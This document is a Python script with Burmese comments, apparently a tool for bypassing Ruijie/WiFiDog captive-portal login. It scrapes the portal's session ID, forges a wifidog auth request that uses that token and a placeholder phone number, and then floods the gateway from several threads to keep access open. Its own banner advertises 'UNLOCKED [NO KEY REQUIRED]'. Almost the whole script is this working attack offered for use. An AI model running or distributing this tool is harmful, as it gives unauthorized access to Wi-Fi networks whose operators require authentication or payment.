import requests
import re
import urllib3
import time
import threading
import logging
import random
import os
import sys
from urllib.parse import urlparse, parse_qs, urljoin

# SSL Warning များကို ပိတ်ထားရန်
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===============================
# COLOR SYSTEM (Pro UI)
# ===============================
RED = "\033[91m"
GREEN = "\033[92m"
CYAN = "\033[96m"
YELLOW = "\033[93m"
MAGENTA = "\033[95m"
WHITE = "\033[97m"
RESET = "\033[0m"

# ===============================
# CONFIGURATION
# ===============================
PING_THREADS = 5
MIN_INTERVAL = 0.05
MAX_INTERVAL = 0.2
DEBUG = False

# ===============================
# LOGGING SETUP
# ===============================
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(message)s",
    datefmt="%H:%M:%S"
)

stop_event = threading.Event()

# ===============================
# NETWORK UTILITIES
# ===============================
def check_real_internet():
    try:
        # Google ကို စမ်းသပ်ပြီး အင်တာနက် အမှန်တကယ် ပွင့်/မပွင့် စစ်ဆေးခြင်း
        return requests.get("http://www.google.com", timeout=3).status_code == 200
    except:
        return False

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def banner():
    print(f"""{MAGENTA}
  ██████╗ ██╗   ██╗██╗     ██╗███████╗
  ██╔══██╗██║   ██║██║     ██║██╔════╝
  ██████╔╝██║   ██║██║     ██║█████╗  
  ██╔══██╗██║   ██║██║     ██║██╔══╝  
  ██║  ██║╚██████╔╝███████╗██║███████╗
  ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝╚══════╝
      {CYAN}RUIJIE NETWORK ENGINE v2.5{RESET}
      {GREEN}STATUS: UNLOCKED [NO KEY REQUIRED]{RESET}
    """)

# ===============================
# HIGH SPEED PING CORE
# ===============================
def high_speed_ping(auth_link, sid):
    session = requests.Session()
    while not stop_event.is_set():
        try:
            # Connection ကို Active ဖြစ်အောင် Pulse ပို့နေခြင်း
            session.get(auth_link, timeout=5, verify=False)
            print(f"{GREEN}[✓]{RESET} SID: {sid[:10]}... | {CYAN}TURBO ACTIVE{RESET}     ", end="\r")
        except:
            print(f"{RED}[X]{RESET} Connection Dropped... Retrying         ", end="\r")
            break
        time.sleep(random.uniform(MIN_INTERVAL, MAX_INTERVAL))

# ===============================
# MAIN ENGINE PROCESS
# ===============================
def start_process():
    clear_screen()
    banner()
    logging.info(f"{CYAN}Initializing Turbo Engine...{RESET}")

    while not stop_event.is_set():
        session = requests.Session()
        test_url = "http://connectivitycheck.gstatic.com/generate_204"

        try:
            # Step 0: Check if already connected
            r = requests.get(test_url, allow_redirects=True, timeout=5)

            if r.url == test_url:
                if check_real_internet():
                    print(f"{YELLOW}[•]{RESET} Internet Active... Monitoring Network    ", end="\r")
                    time.sleep(5)
                    continue

            portal_url = r.url
            parsed_portal = urlparse(portal_url)
            portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"

            print(f"\n{CYAN}[*] Captive Portal Detected: {portal_host}{RESET}")

            # Step 1: Capture Session ID (SID)
            print(f"{WHITE}[*] Capturing Session ID...{RESET}")
            r1 = session.get(portal_url, verify=False, timeout=10)
            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
            r2 = session.get(next_url, verify=False, timeout=10)

            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
            if not sid:
                sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
                sid = sid_match.group(1) if sid_match else None

            if not sid:
                print(f"{RED}[!] Session ID extraction failed.{RESET}")
                time.sleep(5)
                continue

            print(f"{GREEN}[✓]{RESET} SID Found: {sid}")

            # Step 2: Extract Gateway Params
            params = parse_qs(parsed_portal.query)
            gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
            gw_port = params.get('gw_port', ['2060'])[0]

            # Step 3: Construct Auth Link
            auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"

            print(f"{MAGENTA}[*] Launching {PING_THREADS} Turbo Threads...{RESET}")
            
            # Start multi-threaded attack/ping
            for i in range(PING_THREADS):
                t = threading.Thread(
                    target=high_speed_ping,
                    args=(auth_link, sid),
                    daemon=True
                )
                t.start()

            # Maintain Connection Loop
            while check_real_internet():
                time.sleep(5)
            
            print(f"\n{RED}[!] Connection interrupted. Restarting Engine...{RESET}")

        except Exception as e:
            if DEBUG:
                print(f"\n{RED}[Error]: {e}{RESET}")
            time.sleep(5)

# ===============================
# ENTRY POINT
# ===============================
if __name__ == "__main__":
    try:
        start_process()
    except KeyboardInterrupt:
        stop_event.set()
        print(f"\n{RED}[!] Turbo Engine Shutdown Success.{RESET}")
        sys.exit(0)
            
